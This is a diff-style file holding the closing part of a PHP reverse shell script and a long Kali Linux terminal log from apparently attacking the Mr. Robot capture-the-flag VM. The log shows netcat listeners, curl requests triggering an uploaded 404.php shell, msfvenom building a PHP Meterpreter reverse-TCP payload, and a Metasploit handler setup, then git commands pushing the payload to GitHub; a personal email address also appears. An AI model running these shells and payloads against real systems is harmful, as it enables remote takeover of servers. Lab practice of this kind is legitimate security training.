+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+
+
+
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+root@kali:~/php-reverse-shell-1.0# nc --help
+nc: invalid option -- '-'
+nc -h for help
+root@kali:~/php-reverse-shell-1.0# nc -h
+[v1.10-41.1]
+connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
+listen for inbound:	nc -l -p port [-options] [hostname] [port]
+options:
+	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
+	-e filename		program to exec after connect [dangerous!!]
+	-b			allow broadcasts
+	-g gateway		source-routing hop point[s], up to 8
+	-G num			source-routing pointer: 4, 8, 12, ...
+	-h			this cruft
+	-i secs			delay interval for lines sent, ports scanned
+        -k                      set keepalive option on socket
+	-l			listen mode, for inbound connects
+	-n			numeric-only IP addresses, no DNS
+	-o file			hex dump of traffic
+	-p port			local port number
+	-r			randomize local and remote ports
+	-q secs			quit after EOF on stdin and delay of secs
+	-s addr			local source address
+	-T tos			set Type Of Service
+	-t			answer TELNET negotiation
+	-u			UDP mode
+	-v			verbose [use twice to be more verbose]
+	-w secs			timeout for connects and final net reads
+	-C			Send CRLF as line-ending
+	-z			zero-I/O mode [used for scanning]
+port numbers can be individual or ranges: lo-hi [inclusive];
+hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
+root@kali:~/php-reverse-shell-1.0# nc -l -p 1234 192.168.124.187
+^C
+root@kali:~/php-reverse-shell-1.0# nc -l -p 1234 
+^C
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+root@kali:~/php-reverse-shell-1.0# nc -lp 1234 
+^C
+root@kali:~/php-reverse-shell-1.0# msfconsole
+^C
+Aborting...
+root@kali:~/php-reverse-shell-1.0# nc -lp 1234 
+^C
+root@kali:~/php-reverse-shell-1.0# nc -lpv 1234 
+invalid local port v
+root@kali:~/php-reverse-shell-1.0# nc -lvp 1234 
+listening on [any] 1234 ...
+^C
+root@kali:~/php-reverse-shell-1.0# nc -lp 1234 192.168.124.187
+^C
+root@kali:~/php-reverse-shell-1.0# nc -lvp 1234 
+listening on [any] 1234 ...
+7y
+^C
+root@kali:~/php-reverse-shell-1.0# nc -lvp 1234
+listening on [any] 1234 ...
+^C
+root@kali:~/php-reverse-shell-1.0# nc -h
+[v1.10-41.1]
+connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
+listen for inbound:	nc -l -p port [-options] [hostname] [port]
+options:
+	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
+	-e filename		program to exec after connect [dangerous!!]
+	-b			allow broadcasts
+	-g gateway		source-routing hop point[s], up to 8
+	-G num			source-routing pointer: 4, 8, 12, ...
+	-h			this cruft
+	-i secs			delay interval for lines sent, ports scanned
+        -k                      set keepalive option on socket
+	-l			listen mode, for inbound connects
+	-n			numeric-only IP addresses, no DNS
+	-o file			hex dump of traffic
+	-p port			local port number
+	-r			randomize local and remote ports
+	-q secs			quit after EOF on stdin and delay of secs
+	-s addr			local source address
+	-T tos			set Type Of Service
+	-t			answer TELNET negotiation
+	-u			UDP mode
+	-v			verbose [use twice to be more verbose]
+	-w secs			timeout for connects and final net reads
+	-C			Send CRLF as line-ending
+	-z			zero-I/O mode [used for scanning]
+port numbers can be individual or ranges: lo-hi [inclusive];
+hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
+root@kali:~/php-reverse-shell-1.0# nc -lsp 192.168.124.187 1234
+p: forward host lookup failed: Unknown host
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+Connection refused (111)
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+root@kali:~/php-reverse-shell-1.0# nc -lsp 192.168.124.187 1234
+p: forward host lookup failed: Unknown host
+root@kali:~/php-reverse-shell-1.0# nc -lp 1234
+^C
+root@kali:~/php-reverse-shell-1.0# nc -lvp 1234
+listening on [any] 1234 ...
+^C
+root@kali:~/php-reverse-shell-1.0# nc -lvp 443
+listening on [any] 443 ...
+^C
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+Connection refused (111)
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.186/404.php
+curl: (7) Failed to connect to 192.168.124.186 port 80: No route to host
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+root@kali:~/php-reverse-shell-1.0# nc -lvp 1234
+listening on [any] 1234 ...
+^C
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+Connection refused (111)
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+Connection refused (111)
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+root@kali:~/php-reverse-shell-1.0# curl http://192.168.124.187/404.php
+root@kali:~/php-reverse-shell-1.0# nc -lvp 1234
+listening on [any] 1234 ...
+^C
+root@kali:~/php-reverse-shell-1.0# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.124.187 PORT=1234 -f raw >shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 30658 bytes
+
+root@kali:~/php-reverse-shell-1.0# mv shell.php /root/Mr.Robot
+root@kali:~/php-reverse-shell-1.0# ls
+CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  php-reverse-shell.php
+root@kali:~/php-reverse-shell-1.0# cd ..
+root@kali:~# cd Mr.Robot
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  robots.txt  shell.php  sitemap.xml
+root@kali:~/Mr.Robot# msfconsole
+[-] ***rting the metasploit Framework console.../
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v5.0.20-dev                          ]
++ -- --=[ 1886 exploits - 1065 auxiliary - 328 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf5 exploit(multi/handler) > set LPORT 1234
+LPORT => 1234
+msf5 exploit(multi/handler) > set LHOST 192.168.124.187
+LHOST => 192.168.124.187
+msf5 exploit(multi/handler) > exploit -j -z
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[-] Handler failed to bind to 192.168.124.187:1234:-  -
+[*] Started reverse TCP handler on 0.0.0.0:1234 
+msf5 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf5 exploit(multi/handler) > exploit -j -z
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[-] Handler failed to bind to 192.168.124.187:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+msf5 exploit(multi/handler) > exploit -j -z
+[*] Exploit running as background job 2.
+[*] Exploit completed, but no session was created.
+
+[-] Handler failed to bind to 192.168.124.187:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+msf5 exploit(multi/handler) > set LPORT 1234
+LPORT => 1234
+msf5 exploit(multi/handler) > exploit -j -z
+[*] Exploit running as background job 3.
+[*] Exploit completed, but no session was created.
+
+[-] Handler failed to bind to 192.168.124.187:1234:-  -
+[-] Handler failed to bind to 0.0.0.0:1234:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:1234).
+msf5 exploit(multi/handler) > exit
+root@kali:~/Mr.Robot# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.124.187 PORT=4444 -f raw >shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 30658 bytes
+
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  robots.txt  shell.php  sitemap.xml
+root@kali:~/Mr.Robot# rm shell.php
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  robots.txt  sitemap.xml
+root@kali:~/Mr.Robot# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.124.187 PORT=4444 -f raw >shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 30658 bytes
+
+root@kali:~/Mr.Robot# msfconsole
+[-] ***rting the metasploit Framework console.../
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                       https://metasploit.com |
+|______________________________________________________________________________|
+
+
+       =[ metasploit v5.0.20-dev                          ]
++ -- --=[ 1886 exploits - 1064 auxiliary - 328 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+Traceback (most recent call last):
+	13: from /usr/bin/msfconsole:49:in `<main>'
+	12: from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+	11: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+	10: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:134:in `run'
+	 9: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `get_input_line'
+	 8: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:100:in `pgets'
+	 7: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output'
+	 6: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline'
+	 5: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize'
+	 4: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything'
+	 3: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io'
+	 2: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities'
+	 1: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``': Cannot allocate memory - infocmp (Errno::ENOMEM)
+root@kali:~/Mr.Robot# msfconsole
+[-] ***rting the Metasploit Framework console...-
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v5.0.20-dev                          ]
++ -- --=[ 1886 exploits - 1064 auxiliary - 328 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+Traceback (most recent call last):
+	13: from /usr/bin/msfconsole:49:in `<main>'
+	12: from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+	11: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+	10: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:134:in `run'
+	 9: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `get_input_line'
+	 8: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:100:in `pgets'
+	 7: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output'
+	 6: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline'
+	 5: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize'
+	 4: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything'
+	 3: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io'
+	 2: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities'
+	 1: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``': Cannot allocate memory - infocmp (Errno::ENOMEM)
+root@kali:/bin# cd
+root@kali:~# ls
+Desktop    Downloads    Mr.Robot  php-reverse-shell-1.0  Public     Videos
+Documents  fsocity.dic  Music     Pictures               Templates
+root@kali:~# cd Mr.Robot
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  robots.txt  shell.php  sitemap.xml
+root@kali:~/Mr.Robot# msfconsole
+bash: /usr/bin/msfconsole: No such file or directory
+root@kali:~/Mr.Robot# sudo apt-get install msfconsole
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+E: Unable to locate package msfconsole
+root@kali:~/Mr.Robot# git version
+git version 2.20.1
+root@kali:~/Mr.Robot# git init
+Initialized empty Git repository in /root/Mr.Robot/.git/
+root@kali:~/Mr.Robot# touch README.md > # Mr.Robot VM
+bash: syntax error near unexpected token `newline'
+root@kali:~/Mr.Robot# touch README.md># Mr.Robot VM
+bash: syntax error near unexpected token `newline'
+root@kali:~/Mr.Robot# touch README.md>"# Mr.Robot VM"
+root@kali:~/Mr.Robot# ls
+ fsociety.dic   key-1-of-3.txt   README.md    shell.php
+ fsocity.dic   '# Mr.Robot VM'   robots.txt   sitemap.xml
+root@kali:~/Mr.Robot# cat README.md
+root@kali:~/Mr.Robot# rm '# Mr.Robot VM'
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  README.md  robots.txt  shell.php  sitemap.xml
+root@kali:~/Mr.Robot# vim README.md
+root@kali:~/Mr.Robot# git login
+git: 'login' is not a git command. See 'git --help'.
+
+The most similar command is
+	column
+root@kali:~/Mr.Robot# git --help
+usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
+           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
+           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
+           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
+           <command> [<args>]
+
+These are common Git commands used in various situations:
+
+start a working area (see also: git help tutorial)
+   clone      Clone a repository into a new directory
+   init       Create an empty Git repository or reinitialize an existing one
+
+work on the current change (see also: git help everyday)
+   add        Add file contents to the index
+   mv         Move or rename a file, a directory, or a symlink
+   reset      Reset current HEAD to the specified state
+   rm         Remove files from the working tree and from the index
+
+examine the history and state (see also: git help revisions)
+   bisect     Use binary search to find the commit that introduced a bug
+   grep       Print lines matching a pattern
+   log        Show commit logs
+   show       Show various types of objects
+   status     Show the working tree status
+
+grow, mark and tweak your common history
+   branch     List, create, or delete branches
+   checkout    Switch branches or restore working tree files
+   commit     Record changes to the repository
+   diff       Show changes between commits, commit and working tree, etc
+   merge      Join two or more development histories together
+   rebase     Reapply commits on top of another base tip
+   tag        Create, list, delete or verify a tag object signed with GPG
+
+collaborate (see also: git help workflows)
+   fetch      Download objects and refs from another repository
+   pull       Fetch from and integrate with another repository or a local branch
+   push       Update remote refs along with associated objects
+
+'git help -a' and 'git help -g' list available subcommands and some
+concept guides. See 'git help <command>' or 'git help <concept>'
+to read about a specific subcommand or concept.
+root@kali:~/Mr.Robot# git config --global user.email "dcamarena.94@gmail.com"
+root@kali:~/Mr.Robot# git config --list
+user.email=dcamarena.94@gmail.com
+core.repositoryformatversion=0
+core.filemode=true
+core.bare=false
+core.logallrefupdates=true
+root@kali:~/Mr.Robot# git status
+On branch master
+
+No commits yet
+
+Untracked files:
+  (use "git add <file>..." to include in what will be committed)
+
+	README.md
+	fsociety.dic
+	fsocity.dic
+	key-1-of-3.txt
+	robots.txt
+	shell.php
+	sitemap.xml
+
+nothing added to commit but untracked files present (use "git add" to track)
+root@kali:~/Mr.Robot# git add *
+root@kali:~/Mr.Robot# git status
+On branch master
+
+No commits yet
+
+Changes to be committed:
+  (use "git rm --cached <file>..." to unstage)
+
+	new file:   README.md
+	new file:   fsociety.dic
+	new file:   fsocity.dic
+	new file:   key-1-of-3.txt
+	new file:   robots.txt
+	new file:   shell.php
+	new file:   sitemap.xml
+
+root@kali:~/Mr.Robot# rm sitemap.xml
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  README.md  robots.txt  shell.php
+root@kali:~/Mr.Robot# git status
+On branch master
+
+No commits yet
+
+Changes to be committed:
+  (use "git rm --cached <file>..." to unstage)
+
+	new file:   README.md
+	new file:   fsociety.dic
+	new file:   fsocity.dic
+	new file:   key-1-of-3.txt
+	new file:   robots.txt
+	new file:   shell.php
+	new file:   sitemap.xml
+
+Changes not staged for commit:
+  (use "git add/rm <file>..." to update what will be committed)
+  (use "git checkout -- <file>..." to discard changes in working directory)
+
+	deleted:    sitemap.xml
+
+root@kali:~/Mr.Robot# git add *
+root@kali:~/Mr.Robot# git status
+On branch master
+
+No commits yet
+
+Changes to be committed:
+  (use "git rm --cached <file>..." to unstage)
+
+	new file:   README.md
+	new file:   fsociety.dic
+	new file:   fsocity.dic
+	new file:   key-1-of-3.txt
+	new file:   robots.txt
+	new file:   shell.php
+	new file:   sitemap.xml
+
+Changes not staged for commit:
+  (use "git add/rm <file>..." to update what will be committed)
+  (use "git checkout -- <file>..." to discard changes in working directory)
+
+	deleted:    sitemap.xml
+
+root@kali:~/Mr.Robot# git add/rm sitemap.xml
+git: 'add/rm' is not a git command. See 'git --help'.
+root@kali:~/Mr.Robot# git rm sitemap.xml
+rm 'sitemap.xml'
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  README.md  robots.txt  shell.php
+root@kali:~/Mr.Robot# git status
+On branch master
+
+No commits yet
+
+Changes to be committed:
+  (use "git rm --cached <file>..." to unstage)
+
+	new file:   README.md
+	new file:   fsociety.dic
+	new file:   fsocity.dic
+	new file:   key-1-of-3.txt
+	new file:   robots.txt
+	new file:   shell.php
+
+root@kali:~/Mr.Robot# git commit *
+[master (root-commit) da3b067] Archivos de Mr. Robot - 1 de 3 llaves
+ 6 files changed, 869617 insertions(+)
+ create mode 100644 README.md
+ create mode 100644 fsociety.dic
+ create mode 100644 fsocity.dic
+ create mode 100644 key-1-of-3.txt
+ create mode 100644 robots.txt
+ create mode 100644 shell.php
+root@kali:~/Mr.Robot# git status
+On branch master
+nothing to commit, working tree clean
+root@kali:~/Mr.Robot# git remote add origins https://github.com/D-Camarena/Mr.-Robot.git
+root@kali:~/Mr.Robot# git push -u origin master
+fatal: 'origin' does not appear to be a git repository
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  key-1-of-3.txt  README.md  robots.txt  shell.php
+root@kali:~/Mr.Robot# git push -u origins master
+Username for 'https://github.com': D-Camarena
+Password for 'https://D-Camarena@github.com': 
+Enumerating objects: 8, done.
+Counting objects: 100% (8/8), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (5/5), done.
+Writing objects: 100% (8/8), 3.55 MiB | 1.12 MiB/s, done.
+Total 8 (delta 0), reused 0 (delta 0)
+To https://github.com/D-Camarena/Mr.-Robot.git
+ * [new branch]      master -> master
+Branch 'master' set up to track remote branch 'master' from 'origins'.
+root@kali:~/Mr.Robot# 
+
